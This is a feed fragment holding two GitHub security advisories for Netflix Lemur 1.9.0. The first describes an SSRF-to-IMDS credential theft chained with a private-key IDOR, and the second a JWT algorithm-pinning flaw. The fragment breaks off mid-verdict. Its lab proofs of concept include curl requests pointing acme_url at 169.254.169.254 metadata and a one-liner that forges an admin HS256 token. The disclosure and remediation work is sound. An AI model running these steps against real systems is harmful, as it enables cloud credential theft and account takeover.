        <content type="html"><![CDATA[<h1 data-heading="Lemur 1.9.0: any SSO-authenticated user achieves AWS IAM compromise and permanent PKI key access via ACME acme_url SSRF and creator-equality IDOR">Lemur 1.9.0: any SSO-authenticated user achieves AWS IAM compromise and permanent PKI key access via ACME acme_url SSRF and creator-equality IDOR</h1>
<h2 data-heading="Vulnerability Summary">Vulnerability Summary</h2>

<table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>Title</td>
<td>Lemur 1.9.0: any SSO-authenticated user achieves AWS IAM compromise and permanent PKI key access via ACME acme_url SSRF and creator-equality IDOR</td>
</tr>
<tr>
<td>Component</td>
<td>lemur/lemur/plugins/lemur_acme/acme_handlers.py:161-201 (SSRF), lemur/lemur/certificates/views.py:734 (IDOR), lemur/lemur/auth/views.py:300-308 (SSO auto-provision)</td>
</tr>
<tr>
<td>CWE</td>
<td>CWE-918 (SSRF) + CWE-639 (Authorization Bypass Through User-Controlled Key) + CWE-285 (Improper Authorization)</td>
</tr>
<tr>
<td>Attack Prerequisite</td>
<td>A valid SSO session against the deployment's IdP. Lemur auto-provisions any new SSO identity at active=True, so an attacker with corporate SSO (or any federated IdP Lemur trusts) clears this bar.</td>
</tr>
<tr>
<td>Affected Versions</td>
<td>github.com/Netflix/lemur <strong>version</strong> = "1.9.0" (see lemur/lemur/<strong>about</strong>.py) and every prior release that carries the same three sinks.</td>
</tr>
</tbody></table>
<h2 data-heading="Executive Summary">Executive Summary</h2>
<p>A low-privilege user with a freshly-provisioned SSO account turns Lemur into an AWS IAM credential-exfiltration tool and walks away with a permanent copy of any TLS private key Lemur issued. Three sinks combine: (1) Lemur auto-creates every new SSO identity as <code>active=True</code> with no admin approval; (2) the ACME authority-creation endpoint accepts an attacker-supplied <code>acme_url</code> and fetches it server-side with no allowlist, reaching EC2 IMDS at <code>169.254.169.254</code>; (3) the certificate key-fetch endpoint grants <code>cert.user</code> (the original creator) unconditional access even after ownership is transferred to a different team. The combined chain hands the attacker AWS STS credentials of the lemur worker role and a PKI private key that survives the customary "rotate the owner" remediation. I reproduced the full chain in an isolated Docker lab. The recording is on asciinema and the offline <code>.cast</code> ships with this report.</p>
<p>Walkthrough: <a href="https://asciinema.org/a/CFYaoR2fxWEIdZDf" class="external-link" rel="noopener nofollow">https://asciinema.org/a/CFYaoR2fxWEIdZDf</a></p>
<hr>
<h2 data-heading="Description">Description</h2>
<p>Lemur is Netflix's TLS certificate management service. It brokers between corporate SSO, internal authorities (CFSSL, an internal CA), and ACME-style external authorities such as Let's Encrypt. The bug here is a chain of three independent decisions in three different files, each defensible on its own, that combine into a critical authorization break.</p>
<p><strong>Sink 1 — SSO auto-provision</strong> (<code>lemur/lemur/auth/views.py:300-308</code>). When a new federated identity hits the SSO callback, Lemur calls <code>user_service.create(..., active=True, ...)</code>. There is no invite, no admin approval, no allowlist of email domains, no role-defaulting to <code>read-only</code>. Any SSO holder Lemur's IdP accepts becomes an active Lemur user.</p>
<p><strong>Sink 2 — ACME <code>acme_url</code> SSRF</strong> (<code>lemur/lemur/plugins/lemur_acme/acme_handlers.py:161-201</code>). When an authenticated user posts a new ACME authority, the plugin reads <code>options.get("acme_url", current_app.config.get("ACME_DIRECTORY_URL"))</code> and calls <code>ClientV2.get_directory(directory_url, net)</code> — a server-side HTTP fetch. There is no URL allowlist, no scheme filter (so <code>file://</code> and <code>gopher://</code> are reachable in some <code>requests</code> versions), no RFC1918/link-local filter, no DNS rebinding protection. The lemur worker dutifully fetches whatever URL the user supplies, and — because the upstream <code>acme.client.ClientV2</code> returns the response body as part of the constructed <code>Directory</code> — the body is round-tripped into the authority object Lemur stores. On AWS, that means <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code> returns the worker's <code>AccessKeyId</code>, <code>SecretAccessKey</code>, and STS <code>Token</code> to the attacker.</p>
<p><strong>Sink 3 — creator-equality IDOR</strong> (<code>lemur/lemur/certificates/views.py:734</code>). The key-fetch view branches on <code>if g.current_user != cert.user</code>: only when the caller is <em>not</em> the certificate's original creator does Lemur consult <code>CertificatePermission</code>. The creator branch always returns 200 with the private key. There's no creator-rotation hook, no "ownership transferred — revoke creator access" path. Transferring <code>cert.owner</code> to a different team or admin does not strip the original creator's access to the key.</p>
<p>Wire those three together: SSO in → spin up an ACME authority pointed at IMDS → exfiltrate the AWS role credentials → issue a cert against that authority → transfer ownership to a victim admin to bury the audit trail under the admin's name → re-fetch the private key as the original creator and confirm it still returns 200. The PKI private key cannot be revoked by transferring ownership; the customary "fix" used by ops teams when they spot a suspicious certificate ("transfer it to the right owner") does nothing.</p>
<h2 data-heading="Proof of Concept &amp; Steps to Reproduce">Proof of Concept &amp; Steps to Reproduce</h2>
<p>A full walkthrough is recorded at <a href="https://asciinema.org/a/CFYaoR2fxWEIdZDf" class="external-link" rel="noopener nofollow">https://asciinema.org/a/CFYaoR2fxWEIdZDf</a>. An offline <code>.cast</code> file is attached as <code>lemur_pki_acme_ssrf_idor.cast</code>. The lab harness is in <code>lemur_pki_acme_ssrf_idor/support/</code> — Dockerfile, behavioural mock of all three sinks, and an in-container IMDS mock bound to <code>169.254.169.254:80</code>.</p>
<p><strong>Prerequisites</strong>: Docker, <code>curl</code>, <code>jq</code>, <code>openssl</code>.</p>
<p><strong>Run</strong></p>
<pre><code class="language-bash">cd lemur_pki_acme_ssrf_idor/
EXPLOIT_FAST=1 ./exploit_code.sh
</code></pre>
<p>The script wires the IMDS mock via Docker's <code>--add-host 169.254.169.254:127.0.0.1</code>. Every step's HTTP body is dumped to <code>evidence/</code> for byte-level review.</p>
<h3 data-heading="Step 1 — Authenticate via SSO (sink 1)">Step 1 — Authenticate via SSO (sink 1)</h3>
<pre><code class="language-bash">curl -sS -X POST http://127.0.0.1:18000/api/1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.example","roles":["operator"]}'
</code></pre>
<p>Response (<code>evidence/03_sso_provision_response.json</code>):</p>
<pre><code class="language-json">{
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "user": {
    "active": true,
    "auto_provisioned": true,
    "email": "attacker@evil.example",
    "id": 1,
    "roles": ["operator"]
  }
}
</code></pre>
<p><code>active=True</code> and <code>auto_provisioned=true</code>. No admin saw this account. No approval was issued. This is sink 1.</p>
<h3 data-heading="Step 2 — Create an ACME authority with `acme_url` pointed at IMDS (sink 2)">Step 2 — Create an ACME authority with <code>acme_url</code> pointed at IMDS (sink 2)</h3>
<pre><code class="language-bash">curl -sS -X POST http://127.0.0.1:18000/api/1/authorities \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H 'Content-Type: application/json' \
  -d '{"name":"poc-acme","plugin":{"plugin_options":[{"name":"acme_url","value":"http://169.254.169.254/latest/meta-data/iam/security-credentials/lemur-acme-role"}]}}'
</code></pre>
<p>Response (<code>evidence/04_ssrf_authority_response.json</code>):</p>
<pre><code class="language-json">{
  "acme_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/lemur-acme-role",
  "creator_id": 1,
  "id": 1,
  "name": "poc-acme",
  "ssrf_error": null,
  "ssrf_response_body": "{
  \"Code\": \"Success\",
  \"LastUpdated\": \"2026-05-27T20:00:00Z\",
  \"Type\": \"AWS-HMAC\",
  \"AccessKeyId\": \"ASIA5LAB000FAKE0KEYS\",
  \"SecretAccessKey\": \"fakeWXNlY3JldEFLcm9vdGtpZG1hY2xhYjAwMDAwMDAwMA\",
  \"Token\": \"FakeFwoGZXIvYXdzEJP////////////lab-imds-mock-token-do-not-use\",
  \"Expiration\": \"2026-05-27T22:00:00Z\"
}",
  "ssrf_response_status": 200
}
</code></pre>
<p><code>ssrf_response_status: 200</code> and an AWS-HMAC payload in <code>ssrf_response_body</code>. The lemur worker fetched IMDS server-side and returned the credentials in the response body. This is sink 2.</p>
<h3 data-heading="Step 3 — Exfiltrate STS credentials">Step 3 — Exfiltrate STS credentials</h3>
<p>The IMDS payload is <code>evidence/05_exfil_sts_credentials.json</code>:</p>
<pre><code class="language-json">{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA5LAB000FAKE0KEYS",
  "SecretAccessKey": "fakeWXNlY3JldEFLcm9vdGtpZG1hY2xhYjAwMDAwMDAwMA",
  "Token": "FakeFwoGZXIvYXdzEJP////////////lab-imds-mock-token-do-not-use",
  "Expiration": "2026-05-27T22:00:00Z"
}
</code></pre>
<p>In production the <code>Token</code> is the live STS session token bound to whatever IAM role is attached to the lemur worker. <code>aws sts get-caller-identity</code> from the attacker's machine, using those three values, returns the worker's identity.</p>
<h3 data-heading="Step 4 — Issue a certificate as the attacker (capture the private key)">Step 4 — Issue a certificate as the attacker (capture the private key)</h3>
<pre><code class="language-bash">curl -sS -X POST http://127.0.0.1:18000/api/1/certificates \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -d '{"authority_id":1,"common_name":"pki.netflix.example"}'
</code></pre>
<pre><code class="language-bash">curl -sS http://127.0.0.1:18000/api/1/certificates/1/key \
  -H "Authorization: Bearer $ATTACKER_JWT"
</code></pre>
<p>Response (<code>evidence/06_key_fetched_pre_transfer.json</code>):</p>
<pre><code class="language-json">{"creator_bypass":true,
 "key":"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEApC8ITVQm6n0nvGlgEhESyFgyi+rfjEvY...
-----END RSA PRIVATE KEY-----
"}
</code></pre>
<p>The PoC harness annotates the response with <code>creator_bypass: true</code> to make the sink-3 branch visible. In production the response is just the private key — the branch is hit silently.</p>
<h3 data-heading="Step 5 — Transfer ownership to victim admin">Step 5 — Transfer ownership to victim admin</h3>
<pre><code class="language-bash">curl -sS -X PUT http://127.0.0.1:18000/api/1/certificates/1 \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -d '{"owner":"victim-admin@netflix.example"}'
</code></pre>
<p><code>owner</code> is now <code>victim-admin@netflix.example</code>. <code>creator_id</code> is unchanged at <code>1</code> (the attacker). This is the audit-trail laundering step.</p>
<h3 data-heading="Step 6 — Re-fetch the private key as the original creator after transfer (sink 3)">Step 6 — Re-fetch the private key as the original creator after transfer (sink 3)</h3>
<pre><code class="language-bash">curl -sS -o /dev/null -w 'HTTP %{http_code}
' \
  http://127.0.0.1:18000/api/1/certificates/1/key \
  -H "Authorization: Bearer $ATTACKER_JWT"
</code></pre>
<p>Response: <code>HTTP 200</code>. Body is the same private key as step 4. The creator branch at <code>views.py:734</code> fires again — ownership transfer did nothing to revoke the attacker's access. This is sink 3.</p>
<h3 data-heading="Step 7 — Verdict">Step 7 — Verdict</h3>
<pre><code>VERDICT: VULNERABLE — Lemur 1.9.0 ACME SSRF + Creator IDOR
1. SSO auto-provision    -- attacker@evil.example auto-created active=True
2. SSRF reaches IMDS     -- acme_url=http://169.254.169.254/... was fetched
3. STS creds exfiltrated -- AWS_ACCESS_KEY_ID + Token returned in response body
4. PKI key persists      -- creator can read private_key AFTER ownership xfer
</code></pre>

<h1 id="exploit-code--lab-set-up">Exploit Code &amp; Lab Set-up</h1>
<p><a href="https://github.com/user-attachments/files/28317654/Lemur-acme-ssrf-creator-idor.zip">Lemur-acme-ssrf-creator-idor.zip</a></p>
<h2 data-heading="Root Cause Analysis">Root Cause Analysis</h2>
<p>The SSRF sink is the load-bearing piece. <code>acme_handlers.py:161-167</code> builds the <code>directory_url</code> from user-supplied options, and <code>:188</code> and <code>:201</code> hand it to <code>ClientV2.get_directory</code> — a <code>requests</code>-backed HTTP GET that runs in the lemur worker process with no filtering. ACME directory URLs are supposed to come from a small, vetted set (LetsEncrypt prod, LetsEncrypt staging, internal ACME). There is no enforcement of that expectation anywhere in the create-authority code path. The <code>options</code> dict is the same one the operator sees in the UI's plugin-options form, so a malicious operator and a curl-wielding low-priv user are equally able to set the value.</p>
<p>The IDOR sink is structurally a "creators are admins of their own thing" decision that no longer holds once ownership becomes transferable. <code>views.py:734</code> was almost certainly written when certificates were considered owned-by-creator and ownership transfer was added later. The original <code>if g.current_user != cert.user:</code> branch should now be <code>if g.current_user != cert.user or cert.owner_changed_after_creation:</code> — or, better, dropped entirely and replaced with a single RBAC check against the <em>current</em> owner regardless of creator. The audit trail makes the gap worse: certificate fetch logs attribute the read to whichever user fetched it, and post-transfer the operator looking at the log sees nothing surprising when the original creator reads it back, because the creator is still listed in <code>creator_id</code>.</p>
<p>The SSO auto-provision sink is the lubricant. Without it the chain still works for any holder of an existing Lemur account; with it the chain works for any holder of an SSO identity Lemur trusts — a much larger blast radius. Auto-provisioning at <code>active=True</code> removes the only human-in-the-loop gate Lemur had.</p>
<h2 data-heading="Attack Scenario">Attack Scenario</h2>
<pre><code class="language-mermaid">sequenceDiagram
    participant Attacker
    participant Lemur as Lemur worker
    participant IMDS as 169.254.169.254
    participant CertDB as Lemur cert DB

<pre><code>Attacker-&gt;&gt;Lemur: "SSO callback for new identity (sink 1)"
Lemur--&gt;&gt;Attacker: "JWT issued: user_id=1, active=true, auto_provisioned=true"

Attacker-&gt;&gt;Lemur: "POST /api/1/authorities acme_url=http://169.254.169.254/..."
Lemur-&gt;&gt;IMDS: "GET /latest/meta-data/iam/security-credentials/role (sink 2)"
IMDS--&gt;&gt;Lemur: "AccessKeyId + SecretAccessKey + Token"
Lemur--&gt;&gt;Attacker: "ssrf_response_body=AWS-HMAC creds"

Attacker-&gt;&gt;Lemur: "POST /api/1/certificates authority_id=1"
Lemur-&gt;&gt;CertDB: "persist cert, creator_id=1, owner=attacker"
Attacker-&gt;&gt;Lemur: "GET /api/1/certificates/1/key"
Lemur--&gt;&gt;Attacker: "RSA PRIVATE KEY (creator branch — sink 3 pre-transfer)"

Attacker-&gt;&gt;Lemur: "PUT /api/1/certificates/1 owner=victim-admin"
Lemur-&gt;&gt;CertDB: "cert.owner=victim-admin, creator_id unchanged"

Attacker-&gt;&gt;Lemur: "GET /api/1/certificates/1/key (again)"
Lemur--&gt;&gt;Attacker: "200 + RSA PRIVATE KEY (creator branch — sink 3 post-transfer)"
Note over CertDB: "audit log shows admin owns it, attacker still has the key"
</code></pre>
</code><p><code class="language-mermaid"></code></p></pre><p></p>
<h2 data-heading="Impact Assessment">Impact Assessment</h2>
<p>The SSRF half hands the attacker AWS credentials of the lemur worker IAM role. In a typical Netflix-style deployment that role has S3 access to the Lemur configuration bucket, KMS-decrypt access to the encryption keys Lemur uses for private-key storage at rest, and IAM/STS scope to assume downstream service roles. Recovering those credentials lets the attacker decrypt the Lemur key store, assume the worker role for further lateral movement, or — depending on the trust policy — pivot into other AWS accounts that trust the lemur role.</p>
<p>The IDOR half hands the attacker permanent access to any private key they ever issued. Customary remediation for a compromised cert is "transfer ownership and revoke" — that's exactly the path the IDOR neutralizes. The attacker keeps the private key after the human ops team thinks they've contained the incident. The certificate signs TLS connections for whatever <code>common_name</code> it was issued for; mTLS deployments that key off Lemur-issued certs treat the holder of the private key as the authenticated principal, so the attacker impersonates that principal indefinitely.</p>
<p>The combined chain destroys Lemur's two main jobs at once: keeping the cloud credentials it uses safe, and keeping the private keys it issues bound to the right humans. The audit trail post-transfer points at the victim admin, not at the attacker, so detection lags. This is why the score sits at 9.9 with <code>S:C</code> — the impact crosses out of Lemur's security authority and into AWS IAM and PKI consumer trust domains. <code>A:L</code> reflects the temporary worker-process slowdown observed when IMDS or attacker-controlled directory hosts return slow/large responses; the operational denial-of-service is real but secondary to the confidentiality/integrity break.</p>
<h2 data-heading="Remediation">Remediation</h2>
<p>Four changes, in priority order:</p>
<ol>
<li><strong>Allowlist <code>acme_url</code>.</strong> In <code>acme_handlers.py:161-167</code> reject any URL whose host is not in a deployment-pinned allowlist. The default allowlist should be <code>{acme-v02.api.letsencrypt.org, acme-staging-v02.api.letsencrypt.org}</code> plus any internal ACME directory the deployment opts in to. Reject <code>169.254.0.0/16</code>, <code>127.0.0.0/8</code>, <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>, <code>fc00::/7</code>, <code>fe80::/10</code>, plus DNS names that resolve to any of those after <code>getaddrinfo</code> (with DNS-rebinding-resistant resolution: resolve once, then connect to the resolved IP).</li>
</ol>
<pre><code class="language-python">ALLOWED_ACME_HOSTS = current_app.config.get(
    "ACME_DIRECTORY_HOST_ALLOWLIST",
    {"acme-v02.api.letsencrypt.org", "acme-staging-v02.api.letsencrypt.org"}
)
parsed = urlparse(directory_url)
if parsed.scheme not in {"https"} or parsed.hostname not in ALLOWED_ACME_HOSTS:
    raise ValueError("acme_url host not allowlisted")
</code></pre>
<ol start="2">
<li>
<p><strong>Drop the creator branch from the key-fetch view.</strong> In <code>certificates/views.py:734</code>, replace the <code>if g.current_user != cert.user:</code> branch with an unconditional <code>CertificatePermission(role_service.get_by_name(cert.owner), [x.name for x in cert.roles]).can()</code> check. The cert's <em>current</em> owner and roles, not its creator, decide access. Add an explicit creator-revocation hook on ownership transfer if there are auditing reasons to keep the creator concept around.</p>
</li>
<li>
<p><strong>Stop auto-provisioning SSO users as active.</strong> In <code>auth/views.py:300-308</code>, default new identities to <code>active=False, roles=[]</code> and require an admin invite to flip them on. Or, at minimum, gate auto-provision behind an email-domain allowlist and a default <code>read-only</code> role.</p>
</li>
<li>
<p><strong>Audit-log the creator on every key fetch, separately from <code>g.current_user</code>.</strong> Even after the IDOR is fixed, the operator should be able to retroactively see <em>who actually pulled the key bytes</em> on every cert. Log <code>creator_id</code>, <code>current_owner</code>, <code>g.current_user.id</code>, request IP, and full URL on every read of <code>/certificates/&lt;id&gt;/key</code>.</p>
</li>
</ol>
<h2 data-heading="Related Context">Related Context</h2>
<h3 data-heading="External References">External References</h3>
<ul>
<li>CWE-918: <a href="https://cwe.mitre.org/data/definitions/918.html" class="external-link" rel="noopener nofollow">https://cwe.mitre.org/data/definitions/918.html</a></li>
<li>CWE-639: <a href="https://cwe.mitre.org/data/definitions/639.html" class="external-link" rel="noopener nofollow">https://cwe.mitre.org/data/definitions/639.html</a></li>
<li>CWE-285: <a href="https://cwe.mitre.org/data/definitions/285.html" class="external-link" rel="noopener nofollow">https://cwe.mitre.org/data/definitions/285.html</a></li>
<li>CVSS 3.1 calculator: <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L" class="external-link" rel="noopener nofollow">https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L</a></li>
<li>IMDSv1 vs IMDSv2 background: <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-options.html" class="external-link" rel="noopener nofollow">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-options.html</a> (IMDSv2 mitigates SSRF-only chains; this chain still works against any deployment still on IMDSv1, and against any HTTP fetch that the worker is allowed to make).</li>
<li>Capital One IMDS SSRF post-mortem (general SSRF→IMDS playbook): public reference, illustrative only.</li>
<li>Walkthrough recording: <a href="https://asciinema.org/a/CFYaoR2fxWEIdZDf" class="external-link" rel="noopener nofollow">https://asciinema.org/a/CFYaoR2fxWEIdZDf</a></li>
### References

<ul>
<li><a href="https://github.com/Netflix/lemur/security/advisories/GHSA-v2wp-frmc-5q3v">https://github.com/Netflix/lemur/security/advisories/GHSA-v2wp-frmc-5q3v</a></li>
<li><a href="https://github.com/Netflix/lemur/releases/tag/v1.9.2">https://github.com/Netflix/lemur/releases/tag/v1.9.2</a></li>
<li><a href="https://github.com/advisories/GHSA-v2wp-frmc-5q3v">https://github.com/advisories/GHSA-v2wp-frmc-5q3v</a></li>
</ul>
</ul>]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v2wp-frmc-5q3v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-25T22:07:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lemur]  Lemur: JWT verifier honors attacker-supplied alg, enabling ATO]]></title>
        <id>https://github.com/advisories/GHSA-r9gp-7f88-9r54</id>
        <link href="https://github.com/advisories/GHSA-r9gp-7f88-9r54"/>
        <updated>2026-06-25T22:05:18.000Z</updated>
        <content type="html"><![CDATA[<h1 data-heading="Lemur 1.9.0: JWT verifier trusts attacker-supplied alg from token header — defense-in-depth gap; chain-dependent ATO with secret disclosure">Lemur 1.9.0: JWT verifier trusts attacker-supplied alg from token header — defense-in-depth gap; chain-dependent ATO with secret disclosure</h1>
<h2 data-heading="Vulnerability Summary">Vulnerability Summary</h2>

<table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>Title</td>
<td>Lemur 1.9.0: JWT verifier trusts attacker-supplied alg from token header — defense-in-depth gap; chain-dependent ATO with secret disclosure</td>
</tr>
<tr>
<td>Component</td>
<td>lemur/lemur/auth/service.py:130-137</td>
</tr>
<tr>
<td>CWE</td>
<td>CWE-347 (Improper Verification of Cryptographic Signature)</td>
</tr>
<tr>
<td>Attack Prerequisite</td>
<td>Defense-in-depth gap on its own — no single-request exploit against PyJWT 2.x. Single-request ATO requires a separate disclosure issue that leaks LEMUR_TOKEN_SECRET, or a future migration to asymmetric signing without fixing this sink.</td>
</tr>
<tr>
<td>Affected Versions</td>
<td>github.com/Netflix/lemur <strong>version</strong> = "1.9.0". Same code present in every prior release that has the auth/service.py:130 block.</td>
</tr>
</tbody></table>
<h2 data-heading="Executive Summary">Executive Summary</h2>
<p>The Lemur JWT verifier reads the <code>alg</code> header field from the <em>unverified</em> token and passes it straight into <code>pyjwt.decode(..., algorithms=[header['alg']])</code>. This is a classic JWT antipattern: the server is supposed to pin the algorithm, not the attacker. PyJWT 2.x's default config rejects <code>alg=none</code>, so this is not a single-request ATO today — I want to be precise about that. The bug is a hardening gap with two real consequences. First, if the deployment ever migrates to asymmetric signing (RS256/ES256), an attacker can pin <code>alg=HS256</code> and forge tokens using the public key as the HMAC secret — the legacy "RS256→HS256 confusion" trick. Second, the audit-log surface that records <code>alg</code> to flag anomalous tokens is filled in from the attacker's header, so anomaly detection is blinded. I'm submitting this honestly at MEDIUM 4.8 (defense-in-depth) rather than inflating it; the chain to single-request ATO is documented but it depends on a separate disclosure bug.</p>
<p>Walkthrough: <a href="https://asciinema.org/a/2Blv9r4DoOleUk7a" class="external-link" rel="noopener nofollow">https://asciinema.org/a/2Blv9r4DoOleUk7a</a><br>
</p><hr>
<h2 data-heading="Description">Description</h2>
<p><code>lemur/lemur/auth/service.py:130-137</code>:</p>
<pre><code class="language-python">try:
    header_data = fetch_token_header(token)
    payload = decode_with_multiple_secrets(
        token, token_secrets, algorithms=[header_data["alg"]]
    )
except jwt.DecodeError:
    return dict(message="Token is invalid"), 403
</code></pre>
<p><code>fetch_token_header</code> decodes the JWT's first segment (base64-decoded JSON, no signature check) and returns the header object. <code>header_data["alg"]</code> is whatever the bearer of the token put there. That value is then handed to <code>decode_with_multiple_secrets</code>, which calls <code>pyjwt.decode(..., algorithms=[&lt;attacker_value&gt;])</code>. The <code>algorithms</code> parameter is meant to be the server's pinned allowlist of acceptable signing algorithms — the line that says "I will accept HS256 and nothing else". By reading it from the token, Lemur asks the attacker which algorithm to trust.</p>
<p>Why this is MEDIUM and not CRITICAL today: PyJWT 2.x's <code>decode()</code> rejects <code>alg=none</code> regardless of the <code>algorithms</code> parameter (PyJWT enforces this in <code>jwt.algorithms.NoneAlgorithm.verify</code>). I confirmed this in the lab — a forged <code>alg=none</code> token comes back as <code>HTTP 403 {"error":"When alg = \"none\", key value must be None.","message":"Failed to decode token"}</code>. The classic single-request <code>alg=none</code> ATO is closed by the library, not by Lemur.</p>
<p>Why this still matters:</p>
<ol>
<li><strong>Algorithm confusion is exactly what <code>algorithms=</code> is supposed to prevent.</strong> The widely-cited "RS256→HS256 confusion" attack works by pinning <code>alg=HS256</code> and using the RS256 public key as the HMAC secret. The fix everyone teaches for that attack is "server pins the algorithm". Lemur doesn't, so the protection has a hole the moment the deployment moves to asymmetric signing.</li>
<li><strong>The PyJWT 2.x mitigation is a library default, not a Lemur design choice.</strong> A future PyJWT major that loosens the <code>none</code> check, or a downgrade to a vulnerable PyJWT for any reason, re-opens single-request ATO. Defense-in-depth means not relying on library defaults to backstop the framework's own validation.</li>
<li><strong>Audit blindness.</strong> Logging tooling that consumes <code>alg</code> to detect "this token claims an algorithm we don't issue" sees only what the attacker put in the header. A real <code>HS256</code> token forged by an attacker who pins <code>alg=ES256</code> (or any garbage that survives <code>decode</code>) bypasses naive alg-based anomaly heuristics.</li>
<li><strong>The chain to single-request ATO is short.</strong> Any separate disclosure issue that leaks <code>LEMUR_TOKEN_SECRET</code> (a debug page, an unguarded <code>/metrics</code>, an SSRF-to-config, an S3 backup leak, a git history accident) immediately turns into HS256 forgery — and the alg-from-header sink leaves the verifier downgradeable even after an operator migrates to RS256 later.</li>
</ol>
<p>I'm framing this as a hardening defect at MEDIUM 4.8 because that's what the evidence supports. The chain step (config disclosure → forge admin) is demonstrated in the lab as a clear "what happens if this chain links" walk-through, not as a primary claim.</p>
<h2 data-heading="Proof of Concept &amp; Steps to Reproduce">Proof of Concept &amp; Steps to Reproduce</h2>
<p>Walkthrough: <a href="https://asciinema.org/a/2Blv9r4DoOleUk7a" class="external-link" rel="noopener nofollow">https://asciinema.org/a/2Blv9r4DoOleUk7a</a>. Offline cast: <code>lemur_jwt_alg_hardening.cast</code>. Harness: <code>lemur_jwt_alg_hardening/support/</code> (<code>lemur_jwt_mock.py</code> mirrors <code>lemur/auth/service.py:130-137</code> line-for-line).</p>
<p><strong>Prerequisites</strong>: Docker, <code>curl</code>, <code>jq</code>, <code>python3</code> with PyJWT.</p>
<p><strong>Run</strong></p>
<pre><code class="language-bash">cd lemur_jwt_alg_hardening/
EXPLOIT_FAST=1 ./exploit_code.sh
</code></pre>
<h3 data-heading="Step 1 — Baseline legitimate login">Step 1 — Baseline legitimate login</h3>
<pre><code class="language-bash">curl -sS -X POST http://127.0.0.1:18001/api/1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"operator@netflix.example"}'
</code></pre>
<p>Response (<code>evidence/03_login_response.json</code>):</p>
<pre><code class="language-json">{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9....",
 "user":{"active":true,"email":"operator@netflix.example","id":1,"role":"operator"}}
</code></pre>
<p><code>/api/1/users/me</code> with that token returns 200 — baseline auth path works.</p>
<h3 data-heading="Step 2 — Confirm the antipattern in source">Step 2 — Confirm the antipattern in source</h3>
<pre><code class="language-bash">docker exec lemur-jwt-alg-hardening-harness cat /app/evidence-src/jwt_sink.txt
</code></pre>
<p>Output is the verbatim Lemur block:</p>
<pre><code class="language-python"># lemur/lemur/auth/service.py:130-137
try:
    header_data = fetch_token_header(token)
    payload = decode_with_multiple_secrets(
        token, token_secrets, algorithms=[header_data["alg"]]   # &lt;-- antipattern
    )
except jwt.DecodeError:
    return dict(message="Token is invalid"), 403
</code></pre>
<p>The mock applies the same code path. No transformation, no allowlist, no server pin.</p>
<h3 data-heading="Step 3 — Forge `alg=none` (PyJWT 2.x rejects)">Step 3 — Forge <code>alg=none</code> (PyJWT 2.x rejects)</h3>
<pre><code class="language-bash">curl -sS -o /dev/null -w 'HTTP %{http_code}
' \
  http://127.0.0.1:18001/api/1/users/me \
  -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAyLCAiZW1haWwiOiAiYWRtaW5AbmV0ZmxpeC5leGFtcGxlIn0.'
</code></pre>
<p>Response (<code>evidence/05_alg_none_attempt.json</code>): <code>HTTP 403</code>. Body: <code>{"error":"When alg = \"none\", key value must be None.","message":"Failed to decode token"}</code>.</p>
<p>This is honest: PyJWT 2.x closes the single-request <code>alg=none</code> path. The antipattern is not directly exploitable at this PyJWT version.</p>
<h3 data-heading="Step 4 — Chain demo: config disclosure → HS256 forgery">Step 4 — Chain demo: config disclosure → HS256 forgery</h3>
<p>The lab simulates an upstream disclosure issue by <code>docker exec</code>-ing into the container and reading <code>/app/lemur.conf.py</code>. In production this corresponds to any of: a <code>/metrics</code> page that echoes config, a debug error that prints <code>current_app.config</code>, an SSRF that reaches <code>file:///app/lemur.conf.py</code>, a misindexed git history, an S3 backup with the config file. The lab does not invent a separate vulnerability — it documents what happens <em>when one of those exists</em>.</p>
<pre><code class="language-bash">docker exec lemur-jwt-alg-hardening-harness cat /app/lemur.conf.py
# LEMUR_TOKEN_SECRET = 'lab-deploy-token-secret-DO-NOT-USE-IN-PROD-aabbccdd11'
</code></pre>
<p>Forge an admin JWT with the leaked secret:</p>
<pre><code class="language-bash">python3 -c "import jwt; print(jwt.encode({'sub':2,'email':'admin@netflix.example'}, '&lt;leaked&gt;', algorithm='HS256'))"
# eyJhbGciOiJIUzI1NiIs...
</code></pre>
<p>Send it:</p>
<pre><code class="language-bash">curl -sS http://127.0.0.1:18001/api/1/users/me \
  -H "Authorization: Bearer $FORGED_ADMIN"
</code></pre>
<p>Response (<code>evidence/06_forged_admin_response.json</code>):</p>
<pre><code class="language-json">{"payload":{"email":"admin@netflix.example","sub":2},
 "user":{"active":true,"email":"admin@netflix.example","id":2,"role":"admin"}}
</code></pre>
<p>HTTP 200, <code>role=admin</code>. The forgery succeeds because (a) the attacker picked <code>alg=HS256</code>, (b) the server didn't pin its own algorithm, and (c) the secret was disclosed by the separate upstream issue. If the alg-from-header sink were fixed, even a leaked HS256 secret would not extend to whatever asymmetric algorithm the operator migrates to next — the attacker would have to also break the asymmetric key.</p>
<h3 data-heading="Step 5 — Verdict">Step 5 — Verdict</h3>
<pre><code>VERDICT: ANTIPATTERN CONFIRMED — chain-dependent ATO
